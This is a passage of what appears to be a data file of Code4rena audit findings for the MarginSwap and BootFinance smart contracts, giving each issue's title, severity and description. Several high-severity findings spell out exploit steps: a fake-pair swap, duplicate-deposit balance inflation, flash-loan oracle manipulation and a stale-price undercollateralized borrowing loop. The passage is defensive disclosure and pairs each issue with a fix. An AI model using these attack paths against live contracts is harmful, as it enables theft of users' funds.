This allows someone to be credited multiples of the actual swap result. This can be repeated many times and finally, all tokens can be stolen.

Recommend adding re-entrancy guards (from OpenZeppelin) to all external functions of `MarginRouter`. There might be several attack vectors of this function as the attacker controls many parameters. The idea of first doing an estimation with `UniswapStyleLib.getAmountsOut(amountIn - fees, pairs, tokens)` and updating the user with these estimated amounts, before doing the actual trade, feels quite vulnerable to me. Consider removing the estimation and only doing the actual trade first, then calling `registerTrade` with the actual trade amounts returned."
3.md,Missing `fromToken != toToken` check,high,"Attacker calls `MarginRouter.crossSwapExactTokensForTokens` with a fake pair and the same token[0] == token[1].
`crossSwapExactTokensForTokens(1000 WETH, 0, [ATTACKER_CONTRACT], [WETH, WETH])`. When the amounts are computed by the `amounts = UniswapStyleLib.getAmountsOut(amountIn - fees, pairs, tokens);` call, the attacker contract returns fake reserves that yield 0 output. When `_swapExactT4T` is called, the funds are sent to the fake contract and doing nothing passes all checks in `_swap` call that follows because the `startingBalance` is stored _after_ the initial Fund withdraw to the pair.

```solidity
function _swapExactT4T() {
  // withdraw happens here
    Fund(fund()).withdraw(tokens[0], pairs[0], amounts[0]);
    _swap(amounts, pairs, tokens, fund());
}

function _swap() {
  uint256 startingBalance = IERC20(outToken).balanceOf(_to);
  uint256 endingBalance = IERC20(outToken).balanceOf(_to);
  // passes as startingBalance == endingBalance + 0
  require(
      endingBalance >= startingBalance + amounts[amounts.length - 1],
      ""Defective AMM route; balances don't match""
  );
}
```

The full impact is not yet known as `registerTrade` could still fail when subtracting the `inAmount` and adding 0 `outAmount`.
At least, this attack is similar to a withdrawal which is supposed to only occur after a certain `coolingOffPeriod` has passed, but this time-lock is circumvented with this attack.

Recommend moving the fund withdrawal to the first pair **after** the `startingBalance` assignment. Check `fromToken != toToken` as cyclical trades (arbitrages) are likely not what margin traders are after. Consider if the same check is required for `registerTradeAndBorrow` / `adjustAmounts` functions."
3.md,Price feed can be manipulated,high,"Anyone can trigger an update to the price feed by calling `PriceAware.getCurrentPriceInPeg(token, inAmount, forceCurBlock=true)`.
If the update window has passed, the price will be computed by simulating a Uniswap-like trade with the amounts.
This simulation uses the reserves of the Uniswap pairs which can be changed drastically using flash loans to yield almost arbitrary output amounts, and thus prices. Wrong prices break the core functionality of the contracts such as borrowing on margin, liquidations, etc.

Recommend against using the Uniswap spot price as the real price. Uniswap itself warns against this and instead recommends implementing a [TWAP price oracle](https://uniswap.org/docs/v2/smart-contract-integration/building-an-oracle/) using the `price*CumulativeLast` variables."
3.md,Inconsistent usage of `applyInterest`,high,"It is unclear if the function `applyInterest` is supposed to return a new balance with the interest applied or only the accrued interest? There are various usages of it, some calls add the return value to the old amount:

```solidity
return
bond.amount +
applyInterest(bond.amount, cumulativeYield, yieldQuotientFP);
and some not:

balanceWithInterest = applyInterest(
balance,
yA.accumulatorFP,
yieldQuotientFP
);
```

This makes the code misbehave and return the wrong values for the balance and accrued interest.

Recommend making it consistent in all cases when calling this function."
3.md,Wrong liquidation logic,high,"The `belowMaintenanceThreshold` function decides if a trader can be liquidated:

```solidity
function belowMaintenanceThreshold(CrossMarginAccount storage account)
    internal
    returns (bool)
{
    uint256 loan = loanInPeg(account, true);
    uint256 holdings = holdingsInPeg(account, true);
    // The following should hold:
    // holdings / loan >= 1.1
    // =>
    return 100 * holdings >= liquidationThresholdPercent * loan;
}
```

The inequality in the last equation is wrong because it says the higher the holdings (margin + loan) compared to the loan, the higher the chance of being liquidated. The inverse equality was probably intended `return 100 * holdings <= liquidationThresholdPercent * loan;`. Users that shouldn't be liquidated can be liquidated, and users that should be liquidated cannot get liquidated."
3.md,Users are credited more tokens when paying back debt with `registerTradeAndBorrow`,high,"The `registerTradeAndBorrow` is called with the results of a trade (`inAmount`, `outAmount`). It first tries to pay back any debt with the `outAmount`. However, the **full** `outAmount` is credited to the user again as a deposit in the `adjustAmounts(account, tokenFrom, tokenTo, sellAmount, outAmount);` call. As the user pays back their debt and is credited the same amount again, they are essentially credited twice the `outAmount`, making a profit of one `outAmount`. This can be withdrawn and the process can be repeated until the funds are empty.

In the `adjustAmounts` call, it should only credit `outAmount - extinguishableDebt` as a deposit like in `registerDeposit`.
The `registerDeposit` function correctly handles this case."
3.md,`account.holdsToken` is never set,high,"The `addHolding` function does not update the `account.holdsToken` map.

```solidity
function addHolding(
    CrossMarginAccount storage account,
    address token,
    uint256 depositAmount
) internal {
    if (!hasHoldingToken(account, token)) {
        // SHOULD SET account.holdsToken here
        account.holdingTokens.push(token);
    }

    account.holdings[token] += depositAmount;
}
```

This leads to a critical vulnerability where deposits of the same token keep being pushed to the `account.holdingTokens` array but the sum is correctly updated in `account.holdings[token]`. However, because of the duplicate token in the `holdingTokens` array the same token is counted several times in the `getHoldingAmounts` function:

```solidity
function getHoldingAmounts(address trader)
    external
    view
    override
    returns (
        address[] memory holdingTokens,
        uint256[] memory holdingAmounts
    )
{
    CrossMarginAccount storage account = marginAccounts[trader];
    holdingTokens = account.holdingTokens;

    holdingAmounts = new uint256[](account.holdingTokens.length);
    for (uint256 idx = 0; holdingTokens.length > idx; idx++) {
        address tokenAddress = holdingTokens[idx];
        // RETURNS SUM OF THE BALANCE FOR EACH TOKEN ENTRY
        holdingAmounts[idx] = account.holdings[tokenAddress];
    }
}
```

The `MarginRouter.crossCloseAccount` function uses these wrong amounts to withdraw all tokens:

```solidity
function crossCloseAccount() external {
    (address[] memory holdingTokens, uint256[] memory holdingAmounts) =
        IMarginTrading(marginTrading()).getHoldingAmounts(msg.sender);

    // requires all debts paid off
    IMarginTrading(marginTrading()).registerLiquidation(msg.sender);

    for (uint256 i; holdingTokens.length > i; i++) {
        Fund(fund()).withdraw(
            holdingTokens[i],
            msg.sender,
            holdingAmounts[i]
        );
    }
}
```

An attacker can just deposit the same token X times which increases their balance by X times the actual value.
This inflated balance can then be withdrawn to steal all tokens.

Recommend correctly setting the `account.holdsToken` map in `addHolding`."
3.md,Rewards cannot be withdrawn,high,"The rewards for a recipient in `IncentiveDistribution.sol` are stored in the storage mapping indexed by recipient `accruedReward[recipient]` and the recipient is the actual margin trader account, see `updateAccruedReward`.

These rewards are supposed to be withdrawn through the `withdrawReward` function but `msg.sender` is used here instead of a `recipient` (`withdrawer`) parameter.
However, `msg.sender` is enforced to be the incentive reporter and can therefore not be the margin trader.

Nobody can withdraw the rewards.

Recommend removing the ` isIncentiveReporter(msg.sender)` check from `withdrawReward` function."
3.md,lastUpdatedDay not initialized,high,"The variable lastUpdatedDay in IncentiveDistribution.sol is not (properly) initialized. This means the function updateDayTotals will end up in a very large loop which will lead to an out of gas error. Even if the loop would end, the variable currentDailyDistribution would be updated very often. Thus updateDayTotals cannot be performed.

The entire IncentiveDistribution does not work. If the loop would stop, the variable currentDailyDistribution is not accurate, resulting in a far lower incentive distribution than expected.

Recommend initializing lastUpdatedDay with something like block.timestamp / (1 days)

```solidity
uint256 lastUpdatedDay; # ==> lastUpdatedDay = 0"
3.md,function buyBond charges msg.sender twice,high,"function buyBond transfers amount from msg.sender twice:
Fund(fund()).depositFor(msg.sender, issuer, amount);
...
collectToken(issuer, msg.sender, amount);
```"
3.md,Impossible to call withdrawReward fails due to run out of gas,high,"The withdrawReward (https://github.com/code-423n4/marginswap/blob/main/contracts/IncentiveDistribution.sol#L224) fails due to the loop at https://github.com/code-423n4/marginswap/blob/main/contracts/IncentiveDistribution.sol#L269. Based on testing, the dayDiff would be 18724 and with a gasLimit of 9500000 it stops at iteration 270 due to the fact that lastUpdatedDay is not initialized so is 0. Other than that it could run out of gas also for the loop of allTranches (https://github.com/code-423n4/marginswap/blob/main/contracts/IncentiveDistribution.sol#L281) because it's an unbounded array.

I'm not sure of the logic behind the shrinking of the daily distribution but i think that maybe you just missed to initialize the lastUpdatedDay to the day of deployment? If that's the case it resolves partially the problem because allTranches is theoretically unbounded even though only the owner can add element to it and you should do deeply testing to understand how many elements it can have until it run out of gas. I read the comment that says you tried to shift the gas to the withdrawal people maybe you went too further and is it worth rethinking the design?"
3.md,No default `liquidationThresholdPercent`,medium,"The `IsolatedMarginTrading` contract does not define a default `liquidationThresholdPercent` which means it is set to 0. The `belowMaintenanceThreshold` function uses this value and anyone could be liquidated due to `100 * holdings >= liquidationThresholdPercent * loan = 0` being always true.

Anyone can be liquidated immediately. If the faulty `belowMaintenanceThreshold` function is fixed (see other issue), then nobody could be liquidated which is bad as well.

Recommend setting a default liquidation threshold like in `CrossMarginTrading` contracts."
3.md,Missing checks if pairs equal tokens,medium,"The `UniswapStyleLib.getAmountsOut`, `PriceAware.setLiquidationPath` (and others) don't check that `path.length + 1 == tokens.length` which should always hold true. Also, it does not check that the tokens actually match the pair. It's easy to set faulty liquidation paths which then end up reverting the liquidation transactions."
3.md,No entry checks in crossSwap[Exact]TokensFor[Exact]Tokens,medium,"The functions crossSwapTokensForExactTokens and crossSwapExactTokensForTokens of MarginRouter.sol do not check who is calling the function. They also do not check the contents of pairs and tokens nor do they check if the size of pairs and tokens is the same.

`registerTradeAndBorrow` within `registerTrade` does seem to do an entry check (require(isMarginTrader(msg.sender)...) however as this is an external function msg.sender is the address of MarginRouter.sol, which will verify ok.

Calling these functions allow the caller to trade on behalf of marginswap, which could result in losing funds. It's possible to construct all parameters to circumvent the checks. Also the ""pairs"" can be fully specified; they are contract addresses that are called from getAmountsIn / getAmountsOut and from pair.swap. This way you can call arbitrary (self constructed) code, which can reentrantly call the marginswap code.

Recommend limiting who can call the functions. Perhaps whitelist contents of pairs and tokens. Check the size of pairs and tokens is the same."
3.md,maintainer can be pushed out,medium,"The function liquidate (in both `CrossMarginLiquidation.sol` and `IsolatedMarginLiquidation.sol`) can be called by everyone. If an attacker calls this repeatedly then the maintainer will be punished and eventually be reported as maintainerIsFailing
And then the attacker can take the payouts.

When a non authorized address repeatedly calls liquidate then the following happens: `isAuthorized = false` which means `maintenanceFailures[currentMaintainer]` increases. After sufficient calls it will be higher than the threshold and then
`maintainerIsFailing()` will be true. This results in `canTakeNow` being true, which finally means the following will be executed:

`Fund(fund()).withdraw(PriceAware.peg, msg.sender, maintainerCut);`

An attacker can push out a maintainer and take over the liquidation revenues.

Recommend put authorization on who can call the liquidate function, review the maintainer punishment scheme."
3.md,Several function have no entry check,medium,"The following functions have no entry check or a trivial entry check:

```solidity
withdrawHourlyBond Lending.sol
closeHourlyBondAccount Lending.sol
haircut Lending.sol
addDelegate(own adress...) Admin.sol
removeDelegate(own adress...) Admin.sol
depositStake Admin.sol
disburseLiqStakeAttacks CrossMarginLiquidation.sol
disburseLiqStakeAttacks IsolatedMarginLiquidation.sol
getCurrentPriceInPeg PriceAware.sol
```

By manipulating the input values (for example extremely large values), you might be able to disturb the internal administration of the contract, thus perhaps locking function or giving wrong rates.

Recommend checking the functions to see if they are completely risk free and add entry checks if they are not, and add a comment to notify the function is meant to be called by everyone."
3.md,Users Can Drain Funds From MarginSwap By Making Undercollateralized Borrows If The Price Of A Token Has Moved More Than 10% Since The Last MarginSwap Borrow/Liquidation Involving Accounts Holding That Token.,medium,"Users Can Drain Funds From MarginSwap By Making Undercollateralized Borrows If The Price Of A Token Has Moved More Than 10% Since The Last MarginSwap Borrow/Liquidation Involving Accounts Holding That Token.

MarginSwap's internal price oracle is only updated for a particular token if a borrow or liquidation is attempted for an account that is lending/borrowing that particular token.

For a less popular token, the price could move quite a bit without any borrow or liquidation being called on any account lending/borrowing that token, especially if MarginSwap does not end up being wildly popular, or if it supports lesser known assets.
If the Uniswap price has moved more than 10% (liquidationThresholdPercent - 100) without a borrow or liquidation on an account lending/borrowing that particular token occurring on MarginSwap, then Alice can make undercollateralized loans, leaving behind her collateral and draining funds from the contract.

(1) Alice waits for the Uniswap price for any token to move more than 10% (liquidationThresholdPercent - 100) without a borrow or liquidation occurring for any account lending/borrowing that token occurring on MarginSwap.
(2) When this condition is satisfied, Alice can loop the following actions:
(2.1) If the price has fallen, Alice can use the token as collateral (making sure to use more than UPDATE_MAX_PEG_AMOUNT worth of the token in ETH), borrow ether from MarginSwap, sell the ether for the token on Uniswap, and repeat, leaving coolingOffPeriod blocks between each lend and borrow.
(2.2) If the price has risen, Alice can use ether as collateral, borrow the token from MarginSwap (making sure to use more than UPDATE_MAX_PEG_AMOUNT worth of the token in ETH), sell the token for ether on Uniswap, and repeat, leaving coolingOffPeriod blocks between each lend and borrow.

Because the MarginSwap price is now stale, Alice can borrow more than 100% of the actual value of her collateral, since MarginSwap believes the borrowed funds to only be worth 90% or less than their actual current market value.

The various defenses that MarginSwap has employed against undercollateralized loans are all bypassed:
(a) The exponential moving price average stored within MarginSwap is not updated, because Alice borrows at least UPDATE_MAX_PEG_AMOUNT worth of the token in ETH, so MarginSwap.PriceAware.getPriceFromAMM skips the price update due to the ""outAmount < UPDATE_MAX_PEG_AMOUNT"" condition failing.
(b) CoolingOffPeriod can be bypassed by Alice splitting her deposits and borrows up by 20 blocks (the current value of CoolingOffPeriod). Since deposits do not trigger a price oracle update, Alice can even deposit ahead of time as the price is nearing 10% off of peg, allowing her to perform the borrow right when 10% is passed.
(c) MarginSwap.Lending.registerBorrow check is bypassed. The check is ""meta.totalLending >= meta.totalBorrowed"", but this is a global check that only ensures that the contract as a whole has sufficient tokens to fund Alice's borrow. Alice simply needs to ensure that she only borrows up to the amount of tokens that the contract currently owns.

Even if the issue of the price oracle stalling were to be fixed by using a large enough UPDATE_MAX_PEG_AMOUNT, since the moving average updates so slowly (MarginSwap is currently set at moving 8/1000th towards new price every 8 blocks) and only when actions are taken on MarginSwap (which may not be frequent on lesser known tokens or if MarginSwap is not too popular), Alice can still take out undercollateralized loans for a period of time before the price oracle catches up.
The real solution here is to use UniswapV2/SushiSwap/UniswapV3's built in TWAP price oracle, especially since MarginSwap is built on top of Uniswap/Sushiswap."
3.md,diffMaxMinRuntime gets default value of 0,medium,"` uint256 public diffMaxMinRuntime;`` This variable is never set nor updated so it gets a default value of 0.  `diffMaxMinRuntime` with 0 value is making the calculations that use it either always return 0 (when multiplying) or fail (when dividing) when calculating bucket indexes or sizes.

Recommend setting the appropriate value for diffMaxMinRuntime and update it whenever min or max runtime variables change."
3.md,PriceAware uses prices from getAmountsOut,medium,"`getPriceFromAMM` relies on values returned from getAmountsOut which can be manipulated (e.g. with the large capital or the help of flash loans). The impact is reduced with UPDATE_MIN_PEG_AMOUNT and UPDATE_MAX_PEG_AMOUNT, however, it is not entirely eliminated.

Uniswap v2 recommends using their TWAP oracle: https://uniswap.org/docs/v2/core-concepts/oracles/"
3.md,Isolated margin contracts declare but do not set the value of liquidationThresholdPercent,medium,"CrossMarginTrading sets value of liquidationThresholdPercent in the constructor: `liquidationThresholdPercent = 110;` Isolated margin contracts declare but do not set the value of liquidationThresholdPercent.

Recommend setting the initial value for the liquidationThresholdPercent in Isolated margin contracts.

This makes function belowMaintenanceThreshold to always return true unless a value is set via function setLiquidationThresholdPercent. Comments indicate that the value should also be set to 110:

```solidity
// The following should hold:
// holdings / loan >= 1.1
// => holdings >= loan \* 1.1
```"
3.md,Add a timelock to functions that set key variables,medium,"Functions like `setLeveragePercent` and `setLiquidationThresholdPercent` for both [`IsolatedMarginTrading`](https://github.com/code-423n4/marginswap/blob/main/contracts/IsolatedMarginTrading.sol) and [`CrossMarginTrading`](https://github.com/code-423n4/marginswap/blob/main/contracts/CrossMarginTrading.sol) should be put behind a timelock because they would give more trust to users. Currently, the owner could call them whenever they want and a position could become liquidable from a block to the other."
3.md,Events not indexed,low,"The `CrossDeposit`, `CrossTrade`, `CrossWithdraw`, `CrossBorrow`, `CrossOvercollateralizedBorrow` events in `MarginRouter` are not indexed. Off-chain scripts cannot efficiently filter these events.

Recommend adding an index on important arguments like `trader`."
3.md,`getReserves` does not check if tokens match,low,"The `UniswapStyleLib.getReserves` function does not check if the tokens are the pair's underlying tokens.
It blindly assumes that the tokens are in the wrong order if the first one does not match but they could also be completely different tokens.

It could be the case that output amounts are computed for completely different tokens because a wrong pair was provided."
3.md,Role 9 in Roles.sol,low,"Roles.sol contains the following: `roles[msg.sender][9] = true;``

It's not clear what the number 9 means. In RoleAware.sol there is a constant with the value 9: `uint256 constant TOKEN_ACTIVATOR = 9;`

The code is more difficult to read without an explanation for the number 9. In case the code would be refactored in the future and the constants in RoleAware.sol are renumbered, the value in Roles.sol would no longer correspond to the right value.

Recommend moving the constants from `Roles.sol` to `RoleAware.sol` and replace 9 with the appropriate constant."
3.md,Multisig wallets can't be used for liquidate,low,"The function liquidate, which is defined in both `CrossMarginLiquidation.sol` and `IsolatedMarginLiquidation.sol`, includes the modifier noIntermediary. This modifier prevents the use of Multisig wallets.

If the maintainer happens to use a multisig wallet they might not experience any issues until they try to call the function liquidate. At that moment they can't successfully call the function.

Recommend verifying if the prevention to use multisig wallets is intentional. In that case add a comment to the liquidate functions. If it is not intentional update the code so multisigs wallets can be supported."
3.md,Different solidity version in UniswapStyleLib.sol,low,"The solidity version in UniswapStyleLib.sol (>=0.5.0) is different than the solidity version in the other contracts (e.g. ^0.8.0)
Also math actions are present in the functions getAmountOut and getAmountIn that could easily lead to an underflow or division by 0; (note safemath is not used). Note: In solidity 0.8.0 safemath like protections are default.

The impact is low because UniswapStyleLib is a library and the solidity version of the contract that uses the library is used (e.g. ^0.8.0), which has safemath like protections. It is cleaner to have the same solidity version everywhere.

getAmountIn(3,1,1000) would give division by 0
getAmountIn(1,1,1) will underflow denominator"
3.md,sortTokens can be simplified,low,"The function sortTokens UniswapStyleLib.sol returns 2 values, but only the first return value is used:
`MarginRouter.sol: (address token0, ) = UniswapStyleLib.sortTokens...`
`UniswapStyleLib.sol: (address token0, ) = sortTokens..`

In both cases the used return value is compared to the first parameter of the function call. Conclusion: the function is only used to determine the smaller of the two tokens, not really to sort tokens.

Recommend simplifying the code:

```solidity
function ASmallerThanB(address tokenA, address tokenB)
internal
pure
returns (bool)
{
    require(tokenA != tokenB, ""Identical address!"");
    require(tokenA != address(0), ""Zero address!"");
    require(tokenB != address(0), ""Zero address!"");
    return tokenA < tokenB;
}
```"
3.md,Duplicated Code In Admin.viewCurrentMaintenanceStaker(),low,"There are four lines of code that are duplicated in `viewCurrentMaintenanceStaker`.

Change this:

```solidity
if (maintenanceStakePerBlock > currentStake) {
    // skip
    staker = nextMaintenanceStaker[staker];
    currentStake = getMaintenanceStakerStake(staker);
} else {
    startBlock += currentStake / maintenanceStakePerBlock;
    staker = nextMaintenanceStaker[staker];
    currentStake = getMaintenanceStakerStake(staker);
}
```

To this:

```solidity
if (maintenanceStakePerBlock <= currentStake) {
     += currentStake / maintenanceStakePerBlock;
}
staker = nextMaintenanceStaker[staker];
currentStake = getMaintenanceStakerStake(staker);
```"
3.md,Magic Numbers used in Admin.\_stake() When Constant Defined Above Can Be Used Instead,low,"Magic Numbers are used in `Admin.\_stake()`, which both obscure the purpose of the function and unnecessarily lead to potential error if the constants are changed during development. Since they are used to refer to a constant defined in RoleAware, and Admin inherits from RoleAware, then Admin can simply call that constant.

In `Admin.\_stake()`, change this:

```solidity
IncentiveDistribution(incentiveDistributor()).addToClaimAmount(1,holder,amount);
```

to this:

```solidity
IncentiveDistribution(incentiveDistributor()).addToClaimAmount(
FUND_TRANSFERER,
holder,
amount
);
```"
3.md,function initTranche should check that the share parameter is > 0,low,"function `initTranche` should check that the ""share"" parameter is > 0, otherwise, it may be possible to initialize the same tranche again."
3.md,runtime > 1 hours error message discrepancy,low,"Here, the revert message says that the value needs to be at least 1 hour, however, the code allows value only above the 1 hour (> instead of >=):
`require(runtime > 1 hours, ""Min runtime needs to be at least 1 hour"");`

There is no real impact on security here, just a discrepancy between the check and message."
3.md,setLeveragePercent should check that new \_leveragePercent >= 100,low,"function `setLeveragePercent` should check that the `\_leveragePercent >= 100` so that this calculation will not fail later:
`(leveragePercent - 100)`

This variable can only be set by admin so as long as he sets the appropriate value it should be fine."
3.md,An erroneous constructor's argument could block the withdrawReward,low,"The constructor of [`IncentiveDistribution`](https://github.com/code-423n4/marginswap/blob/main/contracts/IncentiveDistribution.sol#L32) take as argument the address of MFI token but it doesn't check that is != address(0). Not worth an issue alone but `IncentiveDistribution` imports `IERC20.sol` and never uses it.

In case the address(0) is passed as argument the `withdrawReward` would fail and due to the fact that [MFI is immutable](<](https://github.com/code-423n4/marginswap/blob/main/contracts/IncentiveDistribution.sol#L261)>) the only solution would be to redeploy the contract meanwhile losing trust from the users.

Deploy `IncentiveDistribution` with 0 as `\_MFI argument` and then call `withdrawReward`."
3.md,Not emitting event for important state changes,low,"When changing state variables events are not emitted.

[PriceAware](https://github.com/code-423n4/marginswap/blob/main/contracts/PriceAware.sol):

- setPriceUpdateWindow
- setUpdateRate
- setUpdateMaxPegAmount
- setUpdateMinPegAmount
  Lending (https://github.com/code-423n4/marginswap/blob/main/contracts/Lending.sol):
- activateIssuer
- deactivateIssuer
- setLendingCap
- setLendingBuffer
- setHourlyYieldAPR
- setRuntimeWeights
  IncentiveDistribution (https://github.com/code-423n4/marginswap/blob/main/contracts/IncentiveDistribution.sol#L261):
- setTrancheShare
- initTranche
  IsolatedMarginTrading and CrossMarginTrading (https://github.com/code-423n4/marginswap/blob/main/contracts/IsolatedMarginTrading.sol - https://github.com/code-423n4/marginswap/blob/main/contracts/CrossMarginTrading.sol):
- setCoolingOffPeriod
- setLeveragePercent
- setLiquidationThresholdPercent

The events emitted by [MarginRouter](https://github.com/code-423n4/marginswap/blob/main/contracts/MarginRouter.sol) don't have indexed parameter.

Recommended mitigation:

- For `set... function` emit events with old and new value.
- For `initTranche`, event `InitTranche(uint256 tranche, uint256 share)`
  0 For `activateIssuer`, event `ActivateIssuer(address issuer, address token)`
  For `deactivateIssuer`, event `DeactivateIssuer(address issuer)`

For events emitted by MarginRouter, recommend indexing the trader address to make it filterable."
51.md,"Contract BasicSale is missing an approve(address(vestLock), 2**256-1) call",high,"#### Impact

As we can see in the contracts `AirdropDistribution` and `InvestorDistribution`, they both have the following `approve() call: mainToken.approve(address(vestLock), 2\*\*256-1);`
- <https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/AirdropDistribution.sol#L499>
- <https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/InvestorDistribution.sol#L80>

This is necessary because both contracts transfer tokens to the vesting contract by calling its `vest()` function:
- <https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/AirdropDistribution.sol#L544>
- <https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/AirdropDistribution.sol#L569>
- <https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/InvestorDistribution.sol#L134>
- <https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/InvestorDistribution.sol#L158>

The code of the `vest()` function in the Vesting contract performs a transfer from `msg.sender` to Vesting contract address -> `vestingToken.transferFrom(msg.sender, address(this), \_amount);`
<https://github.com/code-423n4/2021-11-bootfinance/blob/main/vesting/contracts/Vesting.sol#L95>

Same is done in the BasicSale contract:
<https://github.com/code-423n4/2021-11-bootfinance/blob/main/tge/contracts/PublicSale.sol#L225>

The problem is that this contract is missing the `approve()` call. For that reason, the contract is totally useless as the function `\_withdrawShare()` will always revert with the following message:
revert reason: ERC20: transfer amount exceeds allowance. This means that all the `mainToken` sent to the contract would be stuck there forever. No way to retrieve them.

How this issue was not detected in the testing phase?
Very simple. The mock used by the team has an empty `vest()` function that performs no transfer call.
<https://github.com/code-423n4/2021-11-bootfinance/blob/main/tge/contracts/helper/MockVesting.sol#L10>

#### Proof of Concept

See below Brownie's custom output:
```
Calling -> publicsale.withdrawShare(1, 1, {'from': user2})
Transaction sent: 0x9976e4f48bd14f9be8e3e0f4d80fdb8f660afab96a7cbd64fa252510154e7fde
Gas price: 0.0 gwei   Gas limit: 6721975   Nonce: 5
BasicSale.withdrawShare confirmed (ERC20: transfer amount exceeds allowance)   Block: 13577532   Gas used: 323334 (4.81%)

Call trace for '0x9976e4f48bd14f9be8e3e0f4d80fdb8f660afab96a7cbd64fa252510154e7fde':
Initial call cost  \[21344 gas]
BasicSale.withdrawShare  0:3724  \[16114 / -193010 gas]
├── BasicSale.\_withdrawShare  111:1109  \[8643 / 63957 gas]
│   ├── BasicSale.\_updateEmission  116:405  \[53294 / 55739 gas]
│   │   └── BasicSale.getDayEmission  233:248  \[2445 gas]
│   ├── BasicSale.\_processWithdrawal  437:993  \[-7726 / -616 gas]
│   │   ├── BasicSale.getEmissionShare  484:859  \[4956 / 6919 gas]
│   │   │   │
│   │   │   └── MockERC20.balanceOf  \[STATICCALL]  616:738  \[1963 gas]
│   │   │           ├── address: mockerc20.address
│   │   │           ├── input arguments:
│   │   │           │   └── account: publicsale.address
│   │   │           └── return value: 100000000000000000000
│   │   │
│   │   └── SafeMath.sub  924:984  \[191 gas]
│   └── SafeMath.sub  1040:1100  \[191 gas]
│
├── MockERC20.transfer  \[CALL]  1269:1554  \[1115 / 30109 gas]
│   │   ├── address: mockerc20.address
│   │   ├── value: 0
│   │   ├── input arguments:
│   │   │   ├── recipient: user2.address
│   │   │   └── amount: 27272727272727272727
│   │   └── return value: True
│   │
│   └── ERC20.transfer  1366:1534  \[50 / 28994 gas]
│       └── ERC20.\_transfer  1374:1526  \[28944 gas]
└── Vesting.vest  \[CALL]  1705:3712  \[-330491 / -303190 gas]
│   ├── address: vesting.address
│   ├── value: 0
│   ├── input arguments:
│   │   ├── \_beneficiary: user2.address
│   │   ├── \_amount: 63636363636363636363
│   │   └── \_isRevocable: 0
│   └── revert reason: ERC20: transfer amount exceeds allowance <-------------
│
├── SafeMath.add  1855:1883  \[94 gas]
├── SafeMath.add  3182:3210  \[94 gas]
├── SafeMath.add  3236:3264  \[94 gas]
│
└── MockERC20.transferFrom  \[CALL]  3341:3700  \[99923 / 27019 gas]
│   ├── address: mockerc20.address
│   ├── value: 0
│   ├── input arguments:
│   │   ├── sender: publicsale.address
│   │   ├── recipient: vesting.address
│   │   └── amount: 63636363636363636363
│   └── revert reason: ERC20: transfer amount exceeds allowance
│
└── ERC20.transferFrom  3465:3700  \[-97648 / -72904 gas]
└── ERC20.\_transfer  3473:3625  \[24744 gas]
```
#### Tools Used

Manual testing

#### Recommended Mitigation Steps

The following `approve()` call should be added in the constructor of the BasicSale contract:
`mainToken.approve(address(vestLock), 2\*\*256-1);`"
51.md,Can not update target price,high,"#### Impact

The sanity checks in `rampTargetPrice` are broken
[SwapUtils.sol#L1571-L1581](https://github.com/code-423n4/2021-11-bootfinance/blob/main/customswap/contracts/SwapUtils.sol#L1571-L1581)

```solidity
        if (futureTargetPricePrecise < initialTargetPricePrecise) {
            require(
                futureTargetPricePrecise.mul(MAX_RELATIVE_PRICE_CHANGE).div(WEI_UNIT) >= initialTargetPricePrecise,
                ""futureTargetPrice_ is too small""
            );
        } else {
            require(
                futureTargetPricePrecise <= initialTargetPricePrecise.mul(MAX_RELATIVE_PRICE_CHANGE).div(WEI_UNIT),
                ""futureTargetPrice_ is too large""
            );
        }
```

If `futureTargetPricePrecise` is smaller than `initialTargetPricePrecise` 0.01 of `futureTargetPricePrecise` would never larger than `initialTargetPricePrecise`.

Admin would not be able to ramp the target price. As it's one of the most important features of the customswap, I consider this is a high-risk issue

#### Proof of Concept

Here's a web3.py script to demo that it's not possible to change the target price even by 1 wei.

```python
    p1, p2, _, _ =swap.functions.targetPriceStorage().call()
    future = w3.eth.getBlock(w3.eth.block_number)['timestamp'] + 200 * 24 * 3600

    # futureTargetPrice_ is too small
    swap.functions.rampTargetPrice(p1 -1, future).transact()
    # futureTargetPrice_ is too large
    swap.functions.rampTargetPrice(p1 + 1, future).transact()
```

#### Tools Used

None

#### Recommended Mitigation Steps

Would it be something like:

```solidity
        if (futureTargetPricePrecise < initialTargetPricePrecise) {
            require(
                futureTargetPricePrecise.mul(MAX_RELATIVE_PRICE_CHANGE + WEI_UNIT).div(WEI_UNIT) >= initialTargetPricePrecise,
                ""futureTargetPrice_ is too small""
            );
        } else {
            require(
                futureTargetPricePrecise <= initialTargetPricePrecise.mul(MAX_RELATIVE_PRICE_CHANGE + WEI_UNIT).div(WEI_UNIT),
                ""futureTargetPrice_ is too large""
            );
        }
```

I believe the dev would spot this mistake if there's a more relaxed timeline."
51.md,`SwapUtils.sol` Wrong implementation,high,"Based on the context, the `tokenPrecisionMultipliers` used in price calculation should be calculated in realtime based on `initialTargetPrice`, `futureTargetPrice`, `futureTargetPriceTime` and current time, just like `getA()` and `getA2()`.

However, in the current implementation, `tokenPrecisionMultipliers` used in price calculation is the stored value, it will only be changed when the owner called `rampTargetPrice()` and `stopRampTargetPrice()`.

As a result, the `targetPrice` set by the owner will not be effective until another `targetPrice` is being set or `stopRampTargetPrice()` is called.

#### Recommendation

Consider adding `Swap.targetPrice` and changing the `_xp()` at L661 from:

<https://github.com/code-423n4/2021-11-bootfinance/blob/f102ee73eb320532c5a7c1e833f225c479577e39/customswap/contracts/SwapUtils.sol#L661-L667>

```solidity
function _xp(Swap storage self, uint256[] memory balances)
    internal
    view
    returns (uint256[] memory)
{
    return _xp(balances, self.tokenPrecisionMultipliers);
}
```

To:

```solidity
function _xp(Swap storage self, uint256[] memory balances)
    internal
    view
    returns (uint256[] memory)
{
    uint256[2] memory tokenPrecisionMultipliers = self.tokenPrecisionMultipliers;
    tokenPrecisionMultipliers[0] = self.targetPrice.originalPrecisionMultipliers[0].mul(_getTargetPricePrecise(self)).div(WEI_UNIT)
    return _xp(balances, tokenPrecisionMultipliers);
}
```"
51.md,Swaps are not split when trade crosses target price,high,"The protocol uses two amplifier values A1 and A2 for the swap, depending on the target price, see `SwapUtils.determineA`.
The swap curve is therefore a join of two different curves at the target price.
When doing a trade that crosses the target price, it should first perform the trade partially with A1 up to the target price, and then the rest of the trade order with A2.

